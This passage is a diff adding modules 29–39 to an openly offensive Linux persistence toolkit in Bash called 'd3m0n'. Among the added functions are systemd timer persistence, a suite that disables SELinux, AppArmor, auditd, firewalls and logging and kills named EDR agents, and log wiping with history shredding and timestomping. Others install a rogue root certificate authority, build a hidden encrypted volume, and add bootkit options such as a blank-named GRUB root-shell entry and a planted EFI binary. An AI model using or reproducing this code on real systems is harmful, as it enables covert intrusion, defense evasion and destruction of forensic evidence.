+            TIMER_CONTENT+="RandomizedDelaySec=30\nPersistent=true\n[Install]\nWantedBy=timers.target"
+            echo -e "$TIMER_CONTENT" > "/etc/systemd/system/${TN}.timer"
+            systemctl daemon-reload && systemctl enable --now "${TN}.timer" 2>/dev/null
+            echo -e "${GREEN}[+] Timer ${TN} active.${NC}"
+            ;;
+        2)
+            echo "Active d3m0n-style timers:"; systemctl list-timers --all 2>/dev/null | head -20
+            ;;
+        3)
+            read -p "Timer name to remove: " TN
+            systemctl stop "${TN}.timer" 2>/dev/null; systemctl disable "${TN}.timer" 2>/dev/null
+            rm -f "/etc/systemd/system/${TN}.timer" "/etc/systemd/system/${TN}.service"
+            systemctl daemon-reload 2>/dev/null
+            echo -e "${GREEN}[+] Timer ${TN} removed.${NC}"
+            ;;
+    esac
+}
+
+defenseImpair(){
+    echo " [*] T1562 — Impair Defenses Suite [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Disable SELinux          ${CYAN}[2]${NC} Disable AppArmor"
+    echo -e "  ${CYAN}[3]${NC} Tamper auditd            ${CYAN}[4]${NC} Kill history logging"
+    echo -e "  ${CYAN}[5]${NC} Disable firewall         ${CYAN}[6]${NC} Disable syslog/journald"
+    echo -e "  ${CYAN}[7]${NC} Kill EDR agents          ${CYAN}[8]${NC} ALL of the above"
+    read -p "Choice [1-8]: " OPT
+
+    _disable_selinux() {
+        command -v setenforce &>/dev/null && setenforce 0
+        [[ -f /etc/selinux/config ]] && sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config
+        echo -e "${GREEN}  [+] SELinux disabled${NC}"
+    }
+    _disable_apparmor() {
+        systemctl stop apparmor 2>/dev/null; systemctl disable apparmor 2>/dev/null
+        command -v aa-teardown &>/dev/null && aa-teardown 2>/dev/null
+        echo -e "${GREEN}  [+] AppArmor disabled${NC}"
+    }
+    _tamper_auditd() {
+        systemctl stop auditd 2>/dev/null; auditctl -e 0 2>/dev/null; auditctl -D 2>/dev/null
+        echo -e "${GREEN}  [+] Auditd disabled & rules cleared${NC}"
+    }
+    _kill_history() {
+        export HISTSIZE=0 HISTFILESIZE=0
+        unset HISTFILE
+        echo "export HISTCONTROL=ignoreboth" >> /etc/profile
+        echo "HISTSIZE=0" >> /etc/profile
+        ln -sf /dev/null "$HOME/.bash_history" 2>/dev/null
+        echo -e "${GREEN}  [+] History logging impaired${NC}"
+    }
+    _disable_fw() {
+        command -v ufw &>/dev/null && ufw disable 2>/dev/null
+        iptables -F 2>/dev/null; iptables -X 2>/dev/null; iptables -P INPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -P OUTPUT ACCEPT
+        echo -e "${GREEN}  [+] Firewall disabled${NC}"
+    }
+    _disable_syslog() {
+        systemctl stop rsyslog syslog-ng 2>/dev/null; systemctl disable rsyslog syslog-ng 2>/dev/null
+        sed -i 's/^#*Storage=.*/Storage=none/' /etc/systemd/journald.conf 2>/dev/null
+        systemctl restart systemd-journald 2>/dev/null
+        echo -e "${GREEN}  [+] Syslog/journald impaired${NC}"
+    }
+    _kill_edr() {
+        local AGENTS=("falcon-sensor" "cbagentd" "wazuh-agent" "ossec" "mdatp" "clamd")
+        for a in "${AGENTS[@]}"; do
+            systemctl stop "$a" 2>/dev/null; pkill -9 -f "$a" 2>/dev/null
+        done
+        echo -e "${GREEN}  [+] EDR agents killed${NC}"
+    }
+
+    case "$OPT" in
+        1) _disable_selinux ;; 2) _disable_apparmor ;; 3) _tamper_auditd ;;
+        4) _kill_history ;; 5) _disable_fw ;; 6) _disable_syslog ;; 7) _kill_edr ;;
+        8) _disable_selinux; _disable_apparmor; _tamper_auditd; _kill_history; _disable_fw; _disable_syslog; _kill_edr ;;
+        *) echo "[ERROR] Invalid" ;;
+    esac
+}
+
+antiForensics(){
+    echo " [*] T1070 — Anti-Forensics / Indicator Removal [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Timestomp files          ${CYAN}[2]${NC} Wipe logs"
+    echo -e "  ${CYAN}[3]${NC} Destroy shell history    ${CYAN}[4]${NC} Secure file deletion"
+    echo -e "  ${CYAN}[5]${NC} Clear persistence traces ${CYAN}[6]${NC} Full cleanup (all)"
+    read -p "Choice [1-6]: " OPT
+
+    _timestomp() {
+        read -p "File to timestomp: " TF; read -p "Reference file (copy timestamps from): " RF
+        [[ -f "$TF" && -f "$RF" ]] && touch -r "$RF" "$TF" && echo -e "${GREEN}  [+] Timestomped: ${TF}${NC}" || echo "Files not found."
+    }
+    _wipe_logs() {
+        for log in /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure /var/log/kern.log /var/log/daemon.log; do
+            [[ -f "$log" ]] && cat /dev/null > "$log"
+        done
+        cat /dev/null > /var/log/wtmp 2>/dev/null; cat /dev/null > /var/log/btmp 2>/dev/null
+        cat /dev/null > /var/log/lastlog 2>/dev/null; cat /dev/null > /var/run/utmp 2>/dev/null
+        journalctl --vacuum-size=1K 2>/dev/null
+        echo -e "${GREEN}  [+] Logs wiped${NC}"
+    }
+    _destroy_history() {
+        for hf in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.sh_history" "/root/.bash_history"; do
+            [[ -f "$hf" ]] && shred -zu "$hf" 2>/dev/null || rm -f "$hf"
+        done
+        for u in /home/*; do
+            [[ -d "$u" ]] || continue
+            for hf in "$u/.bash_history" "$u/.zsh_history"; do
+                [[ -f "$hf" ]] && shred -zu "$hf" 2>/dev/null
+            done
+        done
+        history -c 2>/dev/null
+        echo -e "${GREEN}  [+] History destroyed${NC}"
+    }
+    _secure_delete() {
+        read -p "File/directory to securely delete: " TD
+        if [[ -d "$TD" ]]; then find "$TD" -type f -exec shred -zu {} \; 2>/dev/null; rm -rf "$TD"
+        elif [[ -f "$TD" ]]; then shred -zu "$TD" 2>/dev/null
+        else echo "Not found."; return; fi
+        echo -e "${GREEN}  [+] Securely deleted: ${TD}${NC}"
+    }
+    _clear_traces() {
+        for f in /etc/cron.d/d3m0n* /etc/systemd/system/d3m0n* /etc/.d3m0n*; do
+            [[ -e "$f" ]] && rm -rf "$f" && echo "  Removed: $f"
+        done
+        systemctl daemon-reload 2>/dev/null
+        echo -e "${GREEN}  [+] Persistence traces cleared${NC}"
+    }
+
+    case "$OPT" in
+        1) _timestomp ;; 2) _wipe_logs ;; 3) _destroy_history ;; 4) _secure_delete ;; 5) _clear_traces ;;
+        6) _wipe_logs; _destroy_history; _clear_traces; echo -e "${GREEN}[+] Full cleanup done.${NC}" ;;
+        *) echo "[ERROR] Invalid" ;;
+    esac
+}
+
+rogueCA(){
+    echo " [*] T1553.004 — Rogue Certificate Authority [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    CA_DIR="/etc/.d3m0n_ca"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    command -v openssl &>/dev/null || { echo "openssl required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Generate & install rogue CA"
+    echo -e "  ${CYAN}[2]${NC} Generate leaf cert for domain"
+    echo -e "  ${CYAN}[3]${NC} Remove rogue CA"
+    read -p "Choice [1-3]: " OPT
+    case "$OPT" in
+        1)
+            read -p "CA Common Name [System Update Authority]: " CN; CN="${CN:-System Update Authority}"
+            mkdir -p "$CA_DIR" 2>/dev/null; chmod 700 "$CA_DIR"
+            openssl genrsa -out "${CA_DIR}/ca.key" 4096 2>/dev/null
+            openssl req -new -x509 -days 3650 -key "${CA_DIR}/ca.key" -out "${CA_DIR}/ca.crt" \
+                -subj "/C=US/ST=CA/O=System/CN=${CN}" 2>/dev/null
+            if [[ -d /usr/local/share/ca-certificates ]]; then
+                cp "${CA_DIR}/ca.crt" /usr/local/share/ca-certificates/system-update-ca.crt
+                update-ca-certificates 2>/dev/null
+            elif [[ -d /etc/pki/ca-trust/source/anchors ]]; then
+                cp "${CA_DIR}/ca.crt" /etc/pki/ca-trust/source/anchors/system-update-ca.crt
+                update-ca-trust 2>/dev/null
+            fi
+            echo -e "${GREEN}[+] Rogue CA installed: ${CN}${NC}"
+            ;;
+        2)
+            [[ ! -f "${CA_DIR}/ca.key" ]] && { echo "Generate CA first."; return; }
+            read -p "Domain (e.g. example.com): " DOMAIN
+            openssl genrsa -out "${CA_DIR}/${DOMAIN}.key" 2048 2>/dev/null
+            openssl req -new -key "${CA_DIR}/${DOMAIN}.key" -out "${CA_DIR}/${DOMAIN}.csr" \
+                -subj "/C=US/ST=CA/O=System/CN=${DOMAIN}" 2>/dev/null
+            openssl x509 -req -days 365 -in "${CA_DIR}/${DOMAIN}.csr" \
+                -CA "${CA_DIR}/ca.crt" -CAkey "${CA_DIR}/ca.key" -CAcreateserial \
+                -out "${CA_DIR}/${DOMAIN}.crt" 2>/dev/null
+            echo -e "${GREEN}[+] Cert: ${CA_DIR}/${DOMAIN}.crt / Key: ${CA_DIR}/${DOMAIN}.key${NC}"
+            ;;
+        3)
+            rm -f /usr/local/share/ca-certificates/system-update-ca.crt 2>/dev/null
+            update-ca-certificates 2>/dev/null
+            rm -f /etc/pki/ca-trust/source/anchors/system-update-ca.crt 2>/dev/null
+            update-ca-trust 2>/dev/null
+            rm -rf "$CA_DIR"
+            echo -e "${GREEN}[+] Rogue CA removed.${NC}"
+            ;;
+    esac
+}
+
+hiddenFS(){
+    echo " [*] T1564.005 — Hidden Encrypted Filesystem [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Create encrypted volume"
+    echo -e "  ${CYAN}[2]${NC} Mount existing volume"
+    echo -e "  ${CYAN}[3]${NC} Unmount volume"
+    echo -e "  ${CYAN}[4]${NC} Emergency wipe (destroy LUKS header)"
+    echo -e "  ${CYAN}[5]${NC} Auto-mount via systemd"
+    read -p "Choice [1-5]: " OPT
+    case "$OPT" in
+        1)
+            read -p "Volume file path [/var/.system_cache.img]: " VF; VF="${VF:-/var/.system_cache.img}"
+            read -p "Size in MB [256]: " SZ; SZ="${SZ:-256}"
+            read -p "Mount point [/mnt/.d3m0n_vault]: " MP; MP="${MP:-/mnt/.d3m0n_vault}"
+            read -p "LUKS passphrase: " -s PASS; echo ""
+            dd if=/dev/urandom of="$VF" bs=1M count="$SZ" status=progress 2>/dev/null
+            echo -n "$PASS" | cryptsetup luksFormat "$VF" --batch-mode -d - 2>/dev/null
+            echo -n "$PASS" | cryptsetup luksOpen "$VF" d3m0n_vault -d - 2>/dev/null
+            mkfs.ext4 /dev/mapper/d3m0n_vault 2>/dev/null
+            mkdir -p "$MP"; mount /dev/mapper/d3m0n_vault "$MP"
+            echo -e "${GREEN}[+] Encrypted volume mounted at ${MP}${NC}"
+            ;;
+        2)
+            read -p "Volume file: " VF; read -p "Mount point: " MP; read -p "Passphrase: " -s PASS; echo ""
+            echo -n "$PASS" | cryptsetup luksOpen "$VF" d3m0n_vault -d - 2>/dev/null
+            mkdir -p "$MP"; mount /dev/mapper/d3m0n_vault "$MP"
+            echo -e "${GREEN}[+] Mounted at ${MP}${NC}"
+            ;;
+        3)
+            umount /dev/mapper/d3m0n_vault 2>/dev/null; cryptsetup luksClose d3m0n_vault 2>/dev/null
+            echo -e "${GREEN}[+] Unmounted.${NC}"
+            ;;
+        4)
+            read -p "Volume file to DESTROY: " VF
+            echo -e "${RED}[!] THIS WILL PERMANENTLY DESTROY ALL DATA!${NC}"
+            read -p "Type 'DESTROY' to confirm: " CONF
+            [[ "$CONF" == "DESTROY" ]] && { dd if=/dev/urandom of="$VF" bs=1M count=2 conv=notrunc 2>/dev/null; echo -e "${GREEN}[+] LUKS header destroyed.${NC}"; } || echo "Aborted."
+            ;;
+        5)
+            read -p "Volume file: " VF; read -p "Mount point: " MP
+            read -p "Key file path (will be created) [/root/.vault.key]: " KF; KF="${KF:-/root/.vault.key}"
+            dd if=/dev/urandom of="$KF" bs=256 count=1 2>/dev/null; chmod 400 "$KF"
+            read -p "Current passphrase: " -s PASS; echo ""
+            echo -n "$PASS" | cryptsetup luksAddKey "$VF" "$KF" -d - 2>/dev/null
+            cat > /etc/systemd/system/d3m0n-vault.service << SVEOF
+[Unit]
+Description=System Cache Volume
+After=local-fs.target
+[Service]
+Type=oneshot
+RemainAfterExit=yes
+ExecStart=/bin/bash -c 'cryptsetup luksOpen ${VF} d3m0n_vault --key-file ${KF} && mkdir -p ${MP} && mount /dev/mapper/d3m0n_vault ${MP}'
+ExecStop=/bin/bash -c 'umount ${MP}; cryptsetup luksClose d3m0n_vault'
+[Install]
+WantedBy=multi-user.target
+SVEOF
+            systemctl daemon-reload && systemctl enable d3m0n-vault.service 2>/dev/null
+            echo -e "${GREEN}[+] Auto-mount configured.${NC}"
+            ;;
+    esac
+}
+
+bootkitPersist(){
+    echo " [*] T1542.003 — Bootkit / Bootloader Persistence [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "${RED}[!] WARNING: Bootloader modification can BRICK the system!${NC}"
+    echo -e "${RED}[!] Ensure you have physical access or out-of-band recovery.${NC}"
+    read -p "Type 'I UNDERSTAND' to continue: " ACK
+    [[ "$ACK" != "I UNDERSTAND" ]] && { echo "Aborted."; return; }
+
+    BOOT_BACKUP="/root/.d3m0n_boot_backup"
+    mkdir -p "$BOOT_BACKUP" 2>/dev/null
+
+    echo -e "  ${CYAN}[1]${NC} GRUB2 40_custom module injection"
+    echo -e "  ${CYAN}[2]${NC} GRUB2 hidden menu entry (root shell)"
+    echo -e "  ${CYAN}[3]${NC} Kernel boot parameter injection"
+    echo -e "  ${CYAN}[4]${NC} EFI System Partition backdoor"
+    echo -e "  ${CYAN}[5]${NC} Restore backups"
+    read -p "Choice [1-5]: " OPT
+    case "$OPT" in
+        1)
+            [[ ! -f /etc/grub.d/40_custom ]] && { echo "GRUB2 not found."; return; }
+            cp /etc/grub.d/40_custom "${BOOT_BACKUP}/40_custom.bak"
+            read -p "Command to execute at boot (e.g. reverse shell one-liner): " CMD
+            cat >> /etc/grub.d/40_custom << GEOF
+
+menuentry "System Recovery Mode" --unrestricted {
+    insmod ext2
+    set root='hd0,msdos1'
+    linux /vmlinuz root=/dev/sda1 ro init=/bin/bash
+}
+GEOF
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo -e "${GREEN}[+] GRUB2 custom entry added. Hidden 'System Recovery Mode' menu entry.${NC}"
+            ;;
+        2)
+            cp /etc/default/grub "${BOOT_BACKUP}/grub_default.bak" 2>/dev/null
+            [[ -f /etc/grub.d/40_custom ]] && cp /etc/grub.d/40_custom "${BOOT_BACKUP}/40_custom.bak"
+            cat >> /etc/grub.d/40_custom << 'GEOF'
+
+menuentry "  " --unrestricted {
+    insmod ext2
+    set root='hd0,msdos1'
+    linux /vmlinuz root=/dev/sda1 ro init=/bin/bash
+    initrd /initrd.img
+}
+GEOF
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo -e "${GREEN}[+] Hidden GRUB2 menu entry (blank name) drops to root shell via init=/bin/bash${NC}"
+            ;;
+        3)
+            cp /etc/default/grub "${BOOT_BACKUP}/grub_default.bak"
+            read -p "Kernel parameter to inject (e.g. 'init=/bin/bash' or 'rdinit=/tmp/payload'): " KPARAM
+            if grep -q "^GRUB_CMDLINE_LINUX=" /etc/default/grub; then
+                sed -i "s|^GRUB_CMDLINE_LINUX=\"\(.*\)\"|GRUB_CMDLINE_LINUX=\"\1 ${KPARAM}\"|" /etc/default/grub
+            else
+                echo "GRUB_CMDLINE_LINUX=\"${KPARAM}\"" >> /etc/default/grub
+            fi
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo -e "${GREEN}[+] Kernel parameter injected: ${KPARAM}${NC}"
+            ;;
+        4)
+            ESP=$(findmnt -n -o TARGET /boot/efi 2>/dev/null || echo "/boot/efi")
+            [[ ! -d "$ESP" ]] && { echo "EFI System Partition not found."; return; }
+            EFI_DIR="${ESP}/EFI"
+            cp -r "$EFI_DIR" "${BOOT_BACKUP}/EFI_backup" 2>/dev/null
+            read -p "Path to malicious .efi binary: " MEFI
+            [[ ! -f "$MEFI" ]] && { echo "File not found."; return; }
+            mkdir -p "${EFI_DIR}/Recovery" 2>/dev/null
+            cp "$MEFI" "${EFI_DIR}/Recovery/bootx64.efi"
+            DISK=$(findmnt -n -o SOURCE /boot/efi 2>/dev/null | head -1)
+            efibootmgr -c -d "${DISK%[0-9]*}" -p "${DISK##*[a-z]}" -L "System Recovery" \
+                -l "\\EFI\\Recovery\\bootx64.efi" 2>/dev/null
+            echo -e "${GREEN}[+] EFI backdoor installed at ${EFI_DIR}/Recovery/bootx64.efi${NC}"
+            ;;
+        5)
+            echo -e "${CYAN}[*] Restoring backups...${NC}"
+            [[ -f "${BOOT_BACKUP}/40_custom.bak" ]] && cp "${BOOT_BACKUP}/40_custom.bak" /etc/grub.d/40_custom
+            [[ -f "${BOOT_BACKUP}/grub_default.bak" ]] && cp "${BOOT_BACKUP}/grub_default.bak" /etc/default/grub
+            [[ -d "${BOOT_BACKUP}/EFI_backup" ]] && {
+                ESP=$(findmnt -n -o TARGET /boot/efi 2>/dev/null || echo "/boot/efi")
+                cp -r "${BOOT_BACKUP}/EFI_backup"/* "${ESP}/EFI/" 2>/dev/null
+                rm -rf "${ESP}/EFI/Recovery" 2>/dev/null
+                efibootmgr 2>/dev/null | grep "System Recovery" | grep -oP 'Boot\K[0-9]+' | while read n; do
+                    efibootmgr -b "$n" -B 2>/dev/null
+                done
+            }
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo -e "${GREEN}[+] Bootloader restored from backups.${NC}"
+            ;;
+    esac
+}
+
 banner() {
     rainbow "
                                   ,
@@ -1305,6 +2805,17 @@ menu() {
                                   [26] Namespace Jail (Container-Based Rootkit)
                                   [27] SSH Tunnel Hijack & Multiplexing Abuse
                                   [28] SSH-IT: PTY MITM Dual-Connection Stealth
+                                  [29] Trap Command Persistence (T1546.005)
+                                  [30] Python Startup Hooks (T1546.018)
+                                  [31] Port Knocking / Socket Filter (T1205.002)
+                                  [32] Binary Trojanization (T1554)
+                                  [33] System-Wide ld.so.preload (T1574.006)
+                                  [34] Systemd Timer Persistence (T1053.006)
+                                  [35] Impair Defenses (T1562)
+                                  [36] Anti-Forensics / Indicator Removal (T1070)
+                                  [37] Rogue Certificate Authority (T1553.004)
+                                  [38] Hidden Encrypted Filesystem (T1564.005)
+                                  [39] Bootkit / Bootloader Persistence (T1542.003)
 
     [*] Coming soon others features [*]
 
@@ -1370,6 +2881,28 @@ EOF
         sshTunnelHijack
     elif [ "$MENUINPUT" == "28" ] || [ "$MENUINPUT" == "28" ]; then
         sshItMitm
+    elif [ "$MENUINPUT" == "29" ] || [ "$MENUINPUT" == "29" ]; then
+        trapPersist
+    elif [ "$MENUINPUT" == "30" ] || [ "$MENUINPUT" == "30" ]; then
+        pythonPersist
+    elif [ "$MENUINPUT" == "31" ] || [ "$MENUINPUT" == "31" ]; then
+        socketFilter
+    elif [ "$MENUINPUT" == "32" ] || [ "$MENUINPUT" == "32" ]; then
+        binaryReplace
+    elif [ "$MENUINPUT" == "33" ] || [ "$MENUINPUT" == "33" ]; then
+        ldsoPreload
+    elif [ "$MENUINPUT" == "34" ] || [ "$MENUINPUT" == "34" ]; then
+        systemdTimerPersist
+    elif [ "$MENUINPUT" == "35" ] || [ "$MENUINPUT" == "35" ]; then
+        defenseImpair
+    elif [ "$MENUINPUT" == "36" ] || [ "$MENUINPUT" == "36" ]; then
+        antiForensics
+    elif [ "$MENUINPUT" == "37" ] || [ "$MENUINPUT" == "37" ]; then
+        rogueCA
+    elif [ "$MENUINPUT" == "38" ] || [ "$MENUINPUT" == "38" ]; then
+        hiddenFS
+    elif [ "$MENUINPUT" == "39" ] || [ "$MENUINPUT" == "39" ]; then
+        bootkitPersist
     else 
         echo "This option does not exist"
     fi
